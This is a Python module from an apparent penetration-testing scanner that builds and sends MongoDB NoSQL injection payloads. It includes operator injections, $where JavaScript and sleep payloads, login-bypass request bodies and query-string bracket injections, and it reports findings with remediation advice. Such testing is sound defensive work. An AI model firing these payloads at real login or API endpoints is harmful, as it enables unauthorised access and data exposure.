"""
GrotAssault — NoSQL injection payloads.

Generates and tests MongoDB-style NoSQL injection payloads:
- Operator injection ($gt, $ne, $regex, $where, $exists)
- JavaScript injection via $where
- Authentication bypass patterns
- Array/object injection
"""

from __future__ import annotations

import json
import logging
from dataclasses import dataclass
from typing import Any, Dict, List, Optional

from krumpa.core import Finding, Severity, Target
from krumpa.core.http_client import HttpClient, HttpClientMixin

logger = logging.getLogger("krumpa.grotassault.nosql")


# ------------------------------------------------------------------
# Payload database
# ------------------------------------------------------------------

@dataclass
class NoSqlPayload(HttpClientMixin):
    """A single NoSQL injection payload."""
    label: str
    value: Any
    category: str  # operator, js_injection, auth_bypass, array
    description: str = ""


# Operator injection — replaces a simple value with an operator object
OPERATOR_PAYLOADS: List[NoSqlPayload] = [
    NoSqlPayload("$ne null", {"$ne": None}, "operator", "Match all non-null values"),
    NoSqlPayload("$ne empty", {"$ne": ""}, "operator", "Match all non-empty values"),
    NoSqlPayload("$gt empty", {"$gt": ""}, "operator", "Match values greater than empty string"),
    NoSqlPayload("$gte empty", {"$gte": ""}, "operator", "Match all with >=''"),
    NoSqlPayload("$exists true", {"$exists": True}, "operator", "Match documents where field exists"),
    NoSqlPayload("$regex wildcard", {"$regex": ".*"}, "operator", "Match all via regex wildcard"),
    NoSqlPayload("$regex case-insensitive", {"$regex": ".*", "$options": "si"}, "operator", "Regex with dotall+case-insensitive"),
    NoSqlPayload("$in array", {"$in": [True, 1, "admin"]}, "operator", "Match if in set"),
    NoSqlPayload("$nin empty", {"$nin": []}, "operator", "Match all (not in empty set)"),
    NoSqlPayload("$or bypass", [{"$gt": ""}, {"$regex": ".*"}], "operator", "$or equivalent via array"),
]

# JavaScript injection via $where (server-side JS execution in MongoDB)
JS_PAYLOADS: List[NoSqlPayload] = [
    NoSqlPayload("$where true", {"$where": "1==1"}, "js_injection", "Server-side JS always-true"),
    NoSqlPayload("$where sleep", {"$where": "sleep(100)"}, "js_injection", "Server-side JS sleep (timing)"),
    NoSqlPayload("$where this", {"$where": "this.password"}, "js_injection", "Enumerate fields via $where"),
    NoSqlPayload("$where function", {"$where": "function(){return true;}"}, "js_injection", "Function form"),
]

# Auth bypass — complete body replacements for login endpoints
AUTH_BYPASS_PAYLOADS: List[Dict[str, Any]] = [
    {"username": {"$ne": ""}, "password": {"$ne": ""}},
    {"username": {"$gt": ""}, "password": {"$gt": ""}},
    {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
    {"username": {"$exists": True}, "password": {"$exists": True}},
    {"username": "admin", "password": {"$ne": ""}},
    {"username": "admin", "password": {"$regex": ".*"}},
    {"username": {"$in": ["admin", "root", "administrator"]}, "password": {"$ne": ""}},
]

# Query-string style injections (for GET params or form-encoded POSTs)
QS_PAYLOADS: List[Dict[str, str]] = [
    {"key[$ne]": "", "label": "bracket $ne"},
    {"key[$gt]": "", "label": "bracket $gt"},
    {"key[$regex]": ".*", "label": "bracket $regex"},
    {"key[$exists]": "true", "label": "bracket $exists"},
    {"key[$where]": "1==1", "label": "bracket $where"},
]

ALL_NOSQL_PAYLOADS = OPERATOR_PAYLOADS + JS_PAYLOADS

# ------------------------------------------------------------------
# Detection patterns
# ------------------------------------------------------------------

_ERROR_PATTERNS: List[str] = [
    "MongoError",
    "mongo",
    "BSON",
    "BSONObj",
    "bad query",
    "SyntaxError",
    "ReferenceError",
    "$where",
    "mapReduce",
    "aggregate",
    "findOne",
    "ObjectId",
    "bsonType",
]


# ------------------------------------------------------------------
# Checker class
# ------------------------------------------------------------------

class NoSqlChecker(HttpClientMixin):
    """
    Test endpoints for NoSQL injection by injecting operator / JS payloads
    and observing differences in responses.
    """

    def __init__(
        self,
        *,
        http_client: Optional[HttpClient] = None,
    ) -> None:
        self._client = http_client
        self._owns_client = http_client is None

    async def check(self, target: Target) -> List[Finding]:
        """
        Run NoSQL injection checks against *target*.

        For POST/PUT/PATCH targets with JSON bodies, injects operator payloads
        into each field. For all targets, checks query-string variants.
        """
        findings: List[Finding] = []

        # Operator injection into JSON body fields
        if target.method.upper() in ("POST", "PUT", "PATCH"):
            body = self._parse_body(target)
            if body:
                findings.extend(await self._test_body_injection(target, body))

            # Auth bypass patterns on login-like endpoints
            if self._is_login_endpoint(target):
                findings.extend(await self._test_auth_bypass(target))

        # Query-string bracket injection
        findings.extend(await self._test_qs_injection(target))

        return findings

    # ------------------------------------------------------------------
    # Static / payload-only access
    # ------------------------------------------------------------------

    @staticmethod
    def get_payloads(category: Optional[str] = None) -> List[NoSqlPayload]:
        """Return payloads, optionally filtered by category."""
        if category:
            return [p for p in ALL_NOSQL_PAYLOADS if p.category == category]
        return list(ALL_NOSQL_PAYLOADS)

    @staticmethod
    def get_auth_bypass_bodies() -> List[Dict[str, Any]]:
        return list(AUTH_BYPASS_PAYLOADS)

    # ------------------------------------------------------------------
    # Internals
    # ------------------------------------------------------------------

    async def _test_body_injection(
        self, target: Target, body: Dict[str, Any],
    ) -> List[Finding]:
        findings: List[Finding] = []
        client = self._get_client()

        try:
            # Get baseline
            baseline = await self._send_json(client, target, body)

            for field_name in body:
                for payload in ALL_NOSQL_PAYLOADS:
                    mutated = dict(body)
                    mutated[field_name] = payload.value
                    resp = await self._send_json(client, target, mutated)

                    if self._is_anomaly(baseline, resp):
                        findings.append(self._make_finding(
                            target, field_name, payload, resp,
                        ))
        finally:
            self._maybe_close(client)

        return findings

    async def _test_auth_bypass(self, target: Target) -> List[Finding]:
        findings: List[Finding] = []
        client = self._get_client()

        try:
            for i, bypass_body in enumerate(AUTH_BYPASS_PAYLOADS):
                resp = await self._send_json(client, target, bypass_body)
                if self._indicates_success(resp):
                    findings.append(Finding(
                        title="NoSQL auth bypass — login succeeded with operator injection",
                        description=(
                            f"Authentication bypass via NoSQL operator injection "
                            f"at {target.url}. Payload #{i+1}: {json.dumps(bypass_body, default=str)}"
                        ),
                        severity=Severity.CRITICAL,
                        target=target,
                        evidence=f"Status: {getattr(resp, 'status_code', '?')}, body: {(getattr(resp, 'text', '') or '')[:200]}",
                        remediation="Sanitise inputs before MongoDB queries. Use parameterised queries or ODM.",
                        cwe=943,
                        tags=["nosql", "injection", "auth-bypass"],
                    ))
        finally:
            self._maybe_close(client)

        return findings

    async def _test_qs_injection(self, target: Target) -> List[Finding]:
        findings: List[Finding] = []
        client = self._get_client()

        try:
            baseline = await client.request(target.method, target.url)

            for qs_payload in QS_PAYLOADS:
                label = qs_payload.get("label", "")
                params = {k: v for k, v in qs_payload.items() if k != "label"}

                sep = "&" if "?" in target.url else "?"
                param_str = "&".join(f"{k}={v}" for k, v in params.items())
                url = f"{target.url}{sep}{param_str}"

                resp = await client.request(target.method, url)
                if self._is_anomaly(baseline, resp):
                    findings.append(Finding(
                        title=f"NoSQL injection via query string ({label})",
                        description=f"Bracket-notation NoSQL injection at {target.url}",
                        severity=Severity.HIGH,
                        target=target,
                        evidence=f"Payload: {param_str}, Status: {getattr(resp, 'status_code', '?')}",
                        remediation="Sanitise bracket-notation query parameters. Reject unexpected object/array values.",
                        cwe=943,
                        tags=["nosql", "injection", "query-string"],
                    ))
        finally:
            self._maybe_close(client)

        return findings

    # -- helpers --

    async def _send_json(self, client: HttpClient, target: Target, body: Any) -> Any:
        return await client.request(
            target.method or "POST",
            target.url,
            json_body=body,
            headers={"Content-Type": "application/json"},
        )

    def _is_anomaly(self, baseline: Any, resp: Any) -> bool:
        """Check if response differs significantly from baseline (error patterns, status change)."""
        b_code = getattr(baseline, "status_code", 200)
        r_code = getattr(resp, "status_code", 200)
        r_text = (getattr(resp, "text", "") or "").lower()

        # Status code class change (e.g. 200→500)
        if r_code // 100 != b_code // 100:
            return True

        # Error pattern in body
        for pat in _ERROR_PATTERNS:
            if pat.lower() in r_text:
                return True

        # Significant size change
        b_len = len(getattr(baseline, "text", "") or "")
        r_len = len(getattr(resp, "text", "") or "")
        if b_len > 0 and abs(r_len - b_len) / max(b_len, 1) > 2.0:
            return True

        return False

    def _indicates_success(self, resp: Any) -> bool:
        """Heuristic: did the auth bypass succeed?"""
        code = getattr(resp, "status_code", 0)
        text = (getattr(resp, "text", "") or "").lower()
        if code in (200, 201, 302, 303):
            # Look for success indicators
            for kw in ("token", "jwt", "session", "welcome", "dashboard", "logged"):
                if kw in text:
                    return True
            # If no reject patterns, 200 on a login is suspicious
            for kw in ("invalid", "unauthorized", "incorrect", "failed", "denied"):
                if kw in text:
                    return False
            return code in (200, 201)
        return False

    @staticmethod
    def _is_login_endpoint(target: Target) -> bool:
        lower = target.url.lower()
        return any(h in lower for h in ("/login", "/signin", "/auth", "/token", "/api/login"))

    @staticmethod
    def _parse_body(target: Target) -> Optional[Dict[str, Any]]:
        if target.body:
            try:
                parsed = json.loads(target.body)
                if isinstance(parsed, dict):
                    return parsed
            except (json.JSONDecodeError, TypeError):
                pass

        return target.metadata.get("body_json")

    def _get_client(self) -> HttpClient:
        if self._client:
            return self._client
        return HttpClient(timeout=10.0, retries=0)

    def _make_finding(
        self, target: Target, field_name: str, payload: NoSqlPayload, resp: Any,
    ) -> Finding:
        """Build a Finding for a detected NoSQL injection."""
        return Finding(
            title=f"NoSQL injection via {payload.category} — {payload.label}",
            description=(
                f"Field '{field_name}' at {target.url} is vulnerable to "
                f"NoSQL {payload.category} injection. {payload.description}"
            ),
            severity=Severity.HIGH,
            target=target,
            evidence=f"Status: {getattr(resp, 'status_code', '?')}, body: {(getattr(resp, 'text', '') or '')[:200]}",
            remediation="Sanitise inputs before MongoDB/NoSQL queries. Use parameterised queries or ODM.",
            cwe=943,
            tags=["nosql", "injection", payload.category],
        )

    def _maybe_close(self, client: HttpClient) -> None:
        # Actual close is async — callers will handle lifecycle
        pass
